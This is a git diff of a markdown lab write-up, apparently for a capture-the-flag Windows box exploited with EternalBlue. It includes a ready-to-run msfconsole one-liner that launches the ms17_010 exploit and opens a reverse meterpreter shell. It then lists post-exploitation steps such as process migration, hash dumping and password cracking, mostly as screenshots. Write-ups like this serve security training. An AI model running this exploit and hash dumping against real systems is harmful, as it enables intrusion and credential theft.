@@ -81,8 +81,6 @@ https://www.exploit-db.com/exploits/41891
 
  ### // Run the script  
 
-
-
  > The script ran, but we don't have an upgraded shell...
 
  ### // Hmmm. Thats not working...  
@@ -93,6 +91,42 @@ https://www.exploit-db.com/exploits/41891
      msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOSTS $IP;set LHOST tun0;run"  
 
  > This time we omit the "set payload windows/x64/shell/reverse_tcp" option. A meterpreter shell will be spun up by default.  
+
+ ![](../thm-blue-meterpreter-default.png)  
+
+ ### Session has started with default meterpreter shell  
+
+ ![](../thm-blue-meterpreter-session-started.png)
+
+ ### List the current processes running on the target  
+
+ ![](../thm-blue-meterpreter-ps.png)  
+
+ ### Get process ID of current meterpreter shell
+
+ ![](../thm-blue-meterpreter-getpid.png)  
+
+ ### Migrate to another process  
+
+ ![](../thm-blue-meterpreter-migrate.png)  
+
+ ### Dump the hashes  
+
+ ![](../thm-blue-meterpreter-hashdump.png)  
+
+ ### Quick and dirty Crackstation  
+
+ ![](../thm-blue-crackstation.png)  
+
+ ### Quick and dirty find flags  
+
+ ![](../thm-blue-find-flags.png)  
+
+
+
+
+
+
 
 
 
